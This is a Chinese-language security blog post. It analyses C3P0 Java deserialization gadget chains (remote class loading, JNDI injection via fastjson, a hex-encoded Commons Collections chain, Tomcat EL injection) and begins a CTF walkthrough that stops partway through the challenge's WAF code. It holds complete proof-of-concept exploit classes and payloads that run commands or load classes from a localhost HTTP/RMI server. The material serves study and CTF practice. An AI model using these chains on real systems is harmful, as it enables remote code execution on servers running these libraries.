<a name="ndNW0"></a>
# 写在前面
开个新坑，依旧是要感谢师傅：<br />[https://xz.aliyun.com/t/11894#toc-0](https://xz.aliyun.com/t/11894#toc-0)<br />[https://boogipop.com/2023/03/03/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E9%80%8F%E6%9E%90/](https://boogipop.com/2023/03/03/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E9%80%8F%E6%9E%90/)<br />[https://goodapple.top/archives/1749](https://goodapple.top/archives/1749)


<a name="stfMO"></a>
# 正片开始
介绍下C3P0<br />C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。<br />JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br />使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。<br />连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。<br />maven依赖
```java
<dependency>
    <groupId>com.mchange</groupId>
    <artifactId>c3p0</artifactId>
    <version>0.9.5.2</version>
</dependency>

```
利用手法：

- URLClassLoader远程类加载
- JNDI注入
- 利用HEX序列化字节加载器进行反序列化攻击
<a name="OhOdN"></a>
# URLClassLoader远程类加载
调用栈
```java
PoolBackedDataSourceBase#readObject ->
ReferenceSerialized#getObject ->
ReferenceableUtils#referenceToObject ->
ObjectFactory#getObjectInstance

```
PoolBackedDataSourceBase.class的readobject
```java
private void readObject( ObjectInputStream ois ) throws IOException, ClassNotFoundException
	{
		short version = ois.readShort();
		switch (version)
		{
			case VERSION:
				// we create an artificial scope so that we can use the name o for all indirectly serialized objects.
				{
					Object o = ois.readObject();
					if (o instanceof IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();
					this.connectionPoolDataSource = (ConnectionPoolDataSource) o;
				}
				this.dataSourceName = (String) ois.readObject();
				// we create an artificial scope so that we can use the name o for all indirectly serialized objects.
				{
					Object o = ois.readObject();
					if (o instanceof IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();
					this.extensions = (Map) o;
				}
				this.factoryClassLocation = (String) ois.readObject();
				this.identityToken = (String) ois.readObject();
				this.numHelperThreads = ois.readInt();
				this.pcs = new PropertyChangeSupport( this );
				this.vcs = new VetoableChangeSupport( this );
				break;
			default:
				throw new IOException("Unsupported Serialized Version: " + version);
		}
	}
```
其中有个getObject方法。如果反序列化得到的类是IndirectlySerialized的实例，则会调用其getObject()方法，然后将返回的类转为ConnectionPoolDataSource类。<br />这个ConnectionPoolDataSource类并没有继承serializable接口，并不能直接序列化。
```java
public interface ConnectionPoolDataSource  extends CommonDataSource 
```
IndirectlySerialized类可以看作是ConnectionPoolDataSource的包装类。
```java
public interface IndirectlySerialized extends Serializable {
    Object getObject() throws ClassNotFoundException, IOException;
}
```
在PoolBackedDataSourceBasewriteobject方法里面
```java
private void writeObject( ObjectOutputStream oos ) throws IOException
	{
		oos.writeShort( VERSION );
		try
		{
			//test serialize
			SerializableUtils.toByteArray(connectionPoolDataSource);
			oos.writeObject( connectionPoolDataSource );
		}
		catch (NotSerializableException nse)
		{
			com.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, "Direct serialization provoked a NotSerializableException! Trying indirect.", nse);
			try
			{
				Indirector indirector = new com.mchange.v2.naming.ReferenceIndirector();
				oos.writeObject( indirector.indirectForm( connectionPoolDataSource ) );
			}
			catch (IOException indirectionIOException)
			{ throw indirectionIOException; }
			catch (Exception indirectionOtherException)
			{ throw new IOException("Problem indirectly serializing connectionPoolDataSource: " + indirectionOtherException.toString() ); }
		}
		oos.writeObject( dataSourceName );
		try
		{
			//test serialize
			SerializableUtils.toByteArray(extensions);
			oos.writeObject( extensions );
		}
		catch (NotSerializableException nse)
		{
			com.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, "Direct serialization provoked a NotSerializableException! Trying indirect.", nse);
			try
			{
				Indirector indirector = new com.mchange.v2.naming.ReferenceIndirector();
				oos.writeObject( indirector.indirectForm( extensions ) );
			}
			catch (IOException indirectionIOException)
			{ throw indirectionIOException; }
			catch (Exception indirectionOtherException)
			{ throw new IOException("Problem indirectly serializing extensions: " + indirectionOtherException.toString() ); }
		}
		oos.writeObject( factoryClassLocation );
		oos.writeObject( identityToken );
		oos.writeInt(numHelperThreads);
	}
```
首先尝试connectionPoolDataSource类，如果失败则用ReferenceIndirector.indirectForm(connectionPoolDataSource)对其进行包装。
```java
public IndirectlySerialized indirectForm(Object var1) throws Exception {
        Reference var2 = ((Referenceable)var1).getReference();
        return new ReferenceSerialized(var2, this.name, this.contextName, this.environmentProperties);
    }
```
返回一个ReferenceSerialized类。
```java
private static class ReferenceSerialized implements IndirectlySerialized {
        Reference reference;
        Name name;
        Name contextName;
        Hashtable env;

        ReferenceSerialized(Reference var1, Name var2, Name var3, Hashtable var4) {
            this.reference = var1;
            this.name = var2;
            this.contextName = var3;
            this.env = var4;
        }
```
ConnectionPoolDataSource类经过序列化后，得到的最终是ReferenceSerialized类。<br />在PoolBackedDataSourceBase#readObject<br />getObject()实际上是调用ReferenceSerialized#getObject()
```java
    public Object getObject() throws ClassNotFoundException, IOException {
            try {
                InitialContext var1;
                if (this.env == null) {
                    var1 = new InitialContext();
                } else {
                    var1 = new InitialContext(this.env);
                }

                Context var2 = null;
                if (this.contextName != null) {
                    var2 = (Context)var1.lookup(this.contextName);
                }

                return ReferenceableUtils.referenceToObject(this.reference, this.name, var2, this.env);
            } catch (NamingException var3) {
                if (ReferenceIndirector.logger.isLoggable(MLevel.WARNING)) {
                    ReferenceIndirector.logger.log(MLevel.WARNING, "Failed to acquire the Context necessary to lookup an Object.", var3);
                }

                throw new InvalidObjectException("Failed to acquire the Context necessary to lookup an Object: " + var3.toString());
            }
        }
```
这里出现了lookup，但由于contextName默认为null，且不可控，因此无法利用。<br />那就往后研究一下referenceToObject方法
```java
public static Object referenceToObject( Reference ref, Name name, Context nameCtx, Hashtable env)
	throws NamingException
    {
	try
	    {
		String fClassName = ref.getFactoryClassName();
		String fClassLocation = ref.getFactoryClassLocation();

		ClassLoader defaultClassLoader = Thread.currentThread().getContextClassLoader();
		if ( defaultClassLoader == null ) defaultClassLoader = ReferenceableUtils.class.getClassLoader();
		
		ClassLoader cl;
		if ( fClassLocation == null )
		    cl = defaultClassLoader;
		else
		    {
			URL u = new URL( fClassLocation );
			cl = new URLClassLoader( new URL[] { u }, defaultClassLoader );
		    }
		
		Class fClass = Class.forName( fClassName, true, cl );
		ObjectFactory of = (ObjectFactory) fClass.newInstance();
		return of.getObjectInstance( ref, name, nameCtx, env );
	    }
	catch ( Exception e )
	    {
		if (Debug.DEBUG) 
		    {
			//e.printStackTrace();
			if ( logger.isLoggable( MLevel.FINE ) )
			    logger.log( MLevel.FINE, "Could not resolve Reference to Object!", e);
		    }
		NamingException ne = new NamingException("Could not resolve Reference to Object!");
		ne.setRootCause( e );
		throw ne;
	    }
    }
```
这里有一个类加载。
```java
package C3P0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class C3P0_URLClassLoader {

    public static class EXP_Loader implements ConnectionPoolDataSource, Referenceable{

        @Override
        public Reference getReference() throws NamingException {
            return new Reference("ExpClass","exp","http://127.0.0.1:9999/");
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    //序列化
    public static void Pool_Serial(ConnectionPoolDataSource c) throws NoSuchFieldException, IllegalAccessException, IOException {
        //反射修改connectionPoolDataSource属性值为我们的恶意ConnectionPoolDataSource类
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Class cls = poolBackedDataSourceBase.getClass();
        Field field = cls.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,c);

        //序列化流写入文件
        FileOutputStream fos = new FileOutputStream(new File("exp.bin"));
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(poolBackedDataSourceBase);

    }

    //反序列化
    public static void Pool_Deserial() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(new File("exp.bin"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fis);
        objectInputStream.readObject();
    }

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        EXP_Loader exp_loader = new EXP_Loader();
        Pool_Serial(exp_loader);
        Pool_Deserial();
    }

}
```
远程挂个exp，监听。
```java
import java.io.IOException;

public class exp {
    public exp() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}

```
<a name="RtBsy"></a>
# jndi
<a name="vH6Vr"></a>
## 利用栈
```java
#修改jndiName
JndiRefConnectionPoolDataSource#setJndiName ->
JndiRefForwardingDataSource#setJndiName
 
#JNDI调用
JndiRefConnectionPoolDataSource#setLoginTime ->
WrapperConnectionPoolDataSource#setLoginTime ->
JndiRefForwardingDataSource#setLoginTimeout ->
JndiRefForwardingDataSource#inner ->
JndiRefForwardingDataSource#dereference() ->
Context#lookup
```
<a name="unLvG"></a>
## 分析
JndiRefConnectionPoolDataSource和JndiRefConnectionPoolDataSource setjndi方法赋值
```java
 public void setJndiName( Object jndiName ) throws PropertyVetoException
    { jrfds.setJndiName( jndiName ); }

public void setJndiName( Object jndiName ) throws PropertyVetoException
	{
		Object oldVal = this.jndiName;
		if ( ! eqOrBothNull( oldVal, jndiName ) )
			vcs.fireVetoableChange( "jndiName", oldVal, jndiName );
		this.jndiName = (jndiName instanceof Name ? ((Name) jndiName).clone() : jndiName /* String */);
		if ( ! eqOrBothNull( oldVal, jndiName ) )
			pcs.firePropertyChange( "jndiName", oldVal, jndiName );
	}
```
JndiRefConnectionPoolDataSource#setLoginTimeout里面会调用setLoginTimeout方法。
```java
public void setLoginTimeout(int seconds)
	throws SQLException
    { wcpds.setLoginTimeout( seconds ); }
public void setLoginTimeout(int seconds)
	throws SQLException
    { getNestedDataSource().setLoginTimeout( seconds ); }
```

getNestedDataSource返回的是JndiRefForwardingDataSource
```java
public synchronized DataSource getNestedDataSource()
	{ return nestedDataSource; }
```
最终调用的是JndiRefForwardingDataSource的setLoginTimeout
```java
public void setLoginTimeout(int seconds) throws SQLException
    { inner().setLoginTimeout( seconds ); }
```
看inner
```java
private synchronized DataSource inner() throws SQLException
    {
	if (cachedInner != null)
	    return cachedInner;
	else
	    {
		DataSource out = dereference();
		if (this.isCaching())
		    cachedInner = out;
		return out;
	    }
    }
```
deference方法
```java
private DataSource dereference() throws SQLException
    {
	Object jndiName = this.getJndiName();
	Hashtable jndiEnv = this.getJndiEnv();
	try
	    {
		InitialContext ctx;
		if (jndiEnv != null)
		    ctx = new InitialContext( jndiEnv );
		else
		    ctx = new InitialContext();
		if (jndiName instanceof String)
		    return (DataSource) ctx.lookup( (String) jndiName );
		else if (jndiName instanceof Name)
		    return (DataSource) ctx.lookup( (Name) jndiName );
		else
		    throw new SQLException("Could not find ConnectionPoolDataSource with " +
					   "JNDI name: " + jndiName);
	    }
	catch( NamingException e )
	    {
		//e.printStackTrace();
		if ( logger.isLoggable( MLevel.WARNING ) )
		    logger.log( MLevel.WARNING, "An Exception occurred while trying to look up a target DataSource via JNDI!", e );
		throw SqlUtils.toSQLException( e ); 
	    }
    }
```
调用了lookup方法。
<a name="dQdR5"></a>
## 构造exp
<a name="wQeqT"></a>
### fastjson环境

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import java.sql.SQLException;

public class C3P0 {
    public static void main(String[] args) throws SQLException {
        //System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
       // ParserConfig.getGlobalInstance().setAutoTypeSupport(true);;
        //ParserConfig.getGlobalInstance().addAccept("com.sun.rowset.JdbcRowSetImpl");
        String payload = "{" +
                "\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\"," +
                "\"JndiName\":\"rmi://127.0.0.1:1099/hello\", " +
                "\"LoginTimeout\":0" +
                "}";
        JSON.parse(payload);
    }
}
```
```java
package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMI_Server_Reference {
    void register() throws Exception{
        LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("evilref","evilref","http://127.0.0.1:8000/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        Naming.bind("rmi://127.0.0.1:1099/hello",refObjWrapper);
        System.out.println("Registry运行中......");
    }

    public static void main(String[] args) throws Exception {
        new RMI_Server_Reference().register();
    }
}

```
这里用的865，很经典的版本，第一次用了高版本8202没打出来.


<a name="iq2l4"></a>
# HEX序列化字节加载器进行反序列化攻击
<a name="oOjGK"></a>
## 调用栈
```java
#设置userOverridesAsString属性值
WrapperConnectionPoolDataSource#setuserOverridesAsString ->
WrapperConnectionPoolDataSourceBase#setUserOverridesAsString
 
#初始化类时反序列化十六进制字节流
WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource ->
C3P0ImplUtils#parseUserOverridesAsString ->
SerializableUtils#fromByteArray ->
SerializableUtils#deserializeFromByteArray ->
ObjectInputStream#readObject
```
<a name="EvD4g"></a>
## 分析
构造函数中userOverides的赋值
```java
public WrapperConnectionPoolDataSource(boolean autoregister)
    {
	super( autoregister );

	setUpPropertyListeners();

	//set up initial value of userOverrides
	try
	    { this.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( this.getUserOverridesAsString() ); }
	catch (Exception e)
	    {
		if ( logger.isLoggable( MLevel.WARNING ) )
		    logger.log( MLevel.WARNING, "Failed to parse stringified userOverrides. " + this.getUserOverridesAsString(), e );
	    }
    }

```
调用了C3P0ImplUtils#parseUserOverridesAsString方法。
```java
public static Map parseUserOverridesAsString( String userOverridesAsString ) throws IOException, ClassNotFoundException
    { 
	if (userOverridesAsString != null)
	    {
		String hexAscii = userOverridesAsString.substring(HASM_HEADER.length() + 1, userOverridesAsString.length() - 1);
		byte[] serBytes = ByteUtils.fromHexAscii( hexAscii );
		return Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );
	    }
	else
	    return Collections.EMPTY_MAP;
    }
```
就不细分析了，从函数名来看，大概就是截取一段十六进制的内容，然后转化成字节数组，并进行序列化。<br />注意一下，在使用substring的时候，会被头部的HASM_HEADER截去，同时尾部去一位。
```java
private final static String HASM_HEADER = "HexAsciiSerializedMap";
```
分析分序列化的过程
```java
public static Object fromByteArray(byte[] bytes) throws IOException, ClassNotFoundException
    { 
	Object out = deserializeFromByteArray( bytes ); 
	if (out instanceof IndirectlySerialized)
	    return ((IndirectlySerialized) out).getObject();
	else
	    return out;
    }



public static Object deserializeFromByteArray(byte[] bytes) throws IOException, ClassNotFoundException
    {
	ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
	return in.readObject();
    }
```
最终也是调用了这个readObject。
<a name="CvTE6"></a>
## 构造payload
```java
private static char toHexDigit(int h)
    {
        char out;
        if (h <= 9) out = (char) (h + 0x30);
        else out = (char) (h + 0x37);
        //System.err.println(h + ": " + out);
        return out;
    }
```
接受一个数，根据数字返回对应的十六进制字符.
```java
static void addHexAscii(byte b, StringWriter sw)
    {
        int ub = b & 0xff;
        int h1 = ub / 16;
        int h2 = ub % 16;
        sw.write(toHexDigit(h1));
        sw.write(toHexDigit(h2));
    }
```
b&ff<br />0xff即255，二进制表示11111111，用于保留二进制低八位的操作，用于保留一个字节。<br />除以16，换成二进制就是四位，那么后四位就作废，取前四位。<br />对十六取余则获取后面四位。<br />最终payload
```java

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.StringWriter;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class C3P0_Hex {

    public static Map CC6() throws NoSuchFieldException,IllegalAccessException{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> hashMap1 = new HashMap<>();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap1,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"abc");
        HashMap<Object,Object> hashMap2 = new HashMap<>();
        hashMap2.put(tiedMapEntry,"enterpr1se");
        lazyMap.remove("abc");


        Class clazz = LazyMap.class;
        Field factoryField = clazz.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,chainedTransformer);
        return hashMap2;
    }

    static void addHexAscii(byte b, StringWriter sw)
    {
        int ub = b & 0xff;
        int h1 = ub / 16;
        int h2 = ub % 16;
        sw.write(toHexDigit(h1));
        sw.write(toHexDigit(h2));
    }
    private static char toHexDigit(int h)
    {
        char out;
        if (h <= 9) out = (char) (h + 0x30);
        else out = (char) (h + 0x37);
        //System.err.println(h + ": " + out);
        return out;
    }
    public static String toHexAscii(byte[] bytes)
    {
        int len = bytes.length;
        StringWriter sw = new StringWriter(len * 2);
        for (int i = 0; i < len; ++i)
            addHexAscii(bytes[i], sw);
        return sw.toString();
    }
    //将类序列化成字节数组
    public static byte[] tobyteArray(Object o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bao);
        oos.writeObject(o);
        return bao.toByteArray();
    }
    public static void main(String[] args) throws Exception{
        String hex = toHexAscii(tobyteArray(CC6()));

        System.out.println(hex);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        ParserConfig.getGlobalInstance().addAccept("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource");
        String payload = "{" +
                "\"1\":{" +
                "\"@type\":\"java.lang.Class\"," +
                "\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"" +
                "}," +
                "\"2\":{" +
                "\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +
                "\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ hex + ";\"," +
                "}" +
                "}";
        String payload2 = "{" +
                "\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +
                "\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ hex + ";\"," +
                "}";
        JSON.parse(payload);

    }
}

```
这里WrapperConnectionPoolDataSource<br />只初始化了一次，却完成了反序列化的操作。<br />按理来说，userOverrides一开始是空的，而在setUserOverridesAsString
```java
public synchronized void setUserOverridesAsString( String userOverridesAsString ) throws PropertyVetoException
	{
		String oldVal = this.userOverridesAsString;
		if ( ! eqOrBothNull( oldVal, userOverridesAsString ) )
			vcs.fireVetoableChange( "userOverridesAsString", oldVal, userOverridesAsString );
		this.userOverridesAsString = userOverridesAsString;
	}
```
这个方法会和旧值进行比较，由于旧值为空，进入if
```java
public void fireVetoableChange(String propertyName, Object oldValue, Object newValue)
            throws PropertyVetoException {
        if (oldValue == null || newValue == null || !oldValue.equals(newValue)) {
            fireVetoableChange(new PropertyChangeEvent(this.source, propertyName, oldValue, newValue));
        }
    }
```
最终跟到vetochangeable方法
```java
public void vetoableChange(PropertyChangeEvent evt ) throws PropertyVetoException
{
    String propName = evt.getPropertyName();
    Object val = evt.getNewValue();
 
    if ( "connectionTesterClassName".equals( propName ) )
    {
        try
        { recreateConnectionTester( (String) val ); }
        catch ( Exception e )
        {
            //e.printStackTrace();
            if ( logger.isLoggable( MLevel.WARNING ) )
                logger.log( MLevel.WARNING, "Failed to create ConnectionTester of class " + val, e );
 
            throw new PropertyVetoException("Could not instantiate connection tester class with name '" + val + "'.", evt);
        }
    }
    //此处进行解析
    else if ("userOverridesAsString".equals( propName ))
    {
        try
        { WrapperConnectionPoolDataSource.this.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( (String) val ); }
        catch (Exception e)
        {
            if ( logger.isLoggable( MLevel.WARNING ) )
                logger.log( MLevel.WARNING, "Failed to parse stringified userOverrides. " + val, e );
 
            throw new PropertyVetoException("Failed to parse stringified userOverrides. " + val, evt);
        }
    }
}
```
如果propName变量为userOverridesAsString，则会直接反序列化传入的十六进制字符串并将返回的对象赋值给userOverrides属性。C3P0通过这种方式，在set完userOverridesAsString属性后直接对其进行解析，减少了一次类初始化操作。<br />在实际利用的时候，我们只需要调用一次setUserOverridesAsString函数即可。
<a name="CK9i3"></a>
# 不出网
以上拿shell是不带回显的，<br />可以加载本地类的BeanFactory，该类getObjectInstace()方法，可以不出网的条件进行EL表达式注入
```java
package C3P0;
 
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
 
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
 
public class C3P0_Tomcat8 {
 
    public static class Tomcat8_Loader implements ConnectionPoolDataSource, Referenceable {
 
        @Override
        public Reference getReference() throws NamingException {
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
            resourceRef.add(new StringRefAddr("forceString", "faster=eval"));
            resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));
            return resourceRef;
        }
 
        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }
 
        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }
 
        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }
 
        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {
 
        }
 
        @Override
        public void setLoginTimeout(int seconds) throws SQLException {
 
        }
 
        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }
 
        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }
 
    //序列化
    public static void Pool_Serial(ConnectionPoolDataSource c) throws NoSuchFieldException, IllegalAccessException, IOException {
        //反射修改connectionPoolDataSource属性值
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Class cls = poolBackedDataSourceBase.getClass();
        Field field = cls.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,c);
 
        //序列化流写入文件
        FileOutputStream fos = new FileOutputStream(new File("exp.bin"));
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(poolBackedDataSourceBase);
 
    }
 
    //反序列化
    public static void Pool_Deserial() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(new File("exp.bin"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fis);
        objectInputStream.readObject();
    }
 
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Tomcat8_Loader tomcat8_loader = new Tomcat8_Loader();
        Pool_Serial(tomcat8_loader);
        Pool_Deserial();
    }
}
```
为了利用成功，可能要添加一下依赖。
```java
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.0</version>
</dependency>
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-el</artifactId>
    <version>8.5.15</version>
</dependency>
```

<a name="KNWdw"></a>
# 例题
ljctr，跟着师傅复现一下。<br />给了waf.jar和DemoApplication.jar,<br />先看一下controller
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.demo.controllers;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class IndexController {
    public IndexController() {
    }

    @ResponseBody
    @RequestMapping({"/"})
    public String index() {
        return "welcome join us.\n it is very easy!";
    }

    @ResponseBody
    @RequestMapping({"/ctf"})
    public String readObject(@RequestParam(name = "data",required = true) String data) throws Exception {
        byte[] bytes = base64Decode(data);
        Pattern pattern = Pattern.compile("ldap", 2);
        Matcher matcher = pattern.matcher(new String(bytes));
        if (matcher.find()) {
            return "don not like ldap";
        } else {
            InputStream inputStream = new ByteArrayInputStream(bytes);
            ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
            objectInputStream.readObject();
            return "oops!";
        }
    }

    public static byte[] base64Decode(String base64) {
        Base64.Decoder decoder = Base64.getDecoder();
        return decoder.decode(base64);
    }
}

```
其中利用正则过滤了ldap字符串

1. **Pattern pattern = Pattern.compile("ldap", 2);**
   - 创建一个正则表达式模式对象 **pattern**，用于匹配字符串中的 "ldap"。
   - 参数 **2** 是标志位，指定了模式的匹配规则，其中 **2** 表示忽略大小写匹配。
2. **Matcher matcher = pattern.matcher(new String(bytes));**
   - 创建一个匹配器对象 **matcher**，并将要匹配的字符串作为参数传入。
   - **new String(bytes)** 将字节数组 **bytes** 转换为字符串。
3. **if (matcher.find()) { return "don not like ldap"; }**
   - 调用 **matcher.find()** 方法进行匹配，查找字符串中是否包含与模式匹配的子串。
   - 如果匹配成功，则返回 "don not like ldap"，表示字符串中包含了 "ldap"。

/ctf路由能够反序列化经b64加密的内容。<br />lib依赖
```java
c3p0-0.9.5.5.jar
jackson-annotations-2.13.0.jar
jackson-core-2.13.0.jar
jackson-databind-2.13.0.jar
jackson-datatype-jdk8-2.13.0.jar
jackson-datatype-jsr310-2.13.0.jar
jackson-module-parameter-names-2.13.0.jar
jakarta.annotation-api-1.3.5.jar
jul-to-slf4j-1.7.32.jar
log4j-api-2.14.1.jar
log4j-to-slf4j-2.14.1.jar
logback-classic-1.2.7.jar
logback-core-1.2.7.jar
mchange-commons-java-0.2.19.jar
slf4j-api-1.7.32.jar
snakeyaml-1.29.jar
spring-aop-5.3.13.jar
spring-beans-5.3.13.jar
spring-boot-2.6.1.jar
spring-boot-autoconfigure-2.6.1.jar
spring-boot-jarmode-layertools-2.6.1.jar
spring-context-5.3.13.jar
spring-core-5.3.13.jar
spring-expression-5.3.13.jar
spring-jcl-5.3.13.jar
spring-web-5.3.13.jar
spring-webmvc-5.3.13.jar
tomcat-embed-core-9.0.55.jar
tomcat-embed-el-9.0.55.jar
tomcat-embed-websocket-9.0.55.jar
```
有c3p0-0.9.5.5.jar，snakeyaml-1.29.jar，tomcat-embed-el-9.0.55.jar<br />题目还给了waf，有可能有过滤
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.net.URLDecoder;
import java.security.ProtectionDomain;
import java.util.List;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.LoaderClassPath;

public class AgentDemo {
    public AgentDemo() {
    }

    public static void main(String[] args) throws Throwable {
        Class.forName("sun.tools.attach.HotSpotAttachProvider");
        List<VirtualMachineDescriptor> vms = VirtualMachine.list();
        String targetPid = null;

        for(int i = 0; i < vms.size(); ++i) {
            VirtualMachineDescriptor vm = (VirtualMachineDescriptor)vms.get(i);
            if (vm.displayName().contains("DemoApplication")) {
                System.out.println(vm.displayName());
                targetPid = vm.id();
                System.out.println(targetPid);
            }
        }

        VirtualMachine virtualMachine = VirtualMachine.attach(targetPid);
        virtualMachine.loadAgent(getJarFileByClass(AgentDemo.class), (String)null);
        virtualMachine.detach();
    }

    public static String getJarFileByClass(Class cs) {
        String fileString = null;
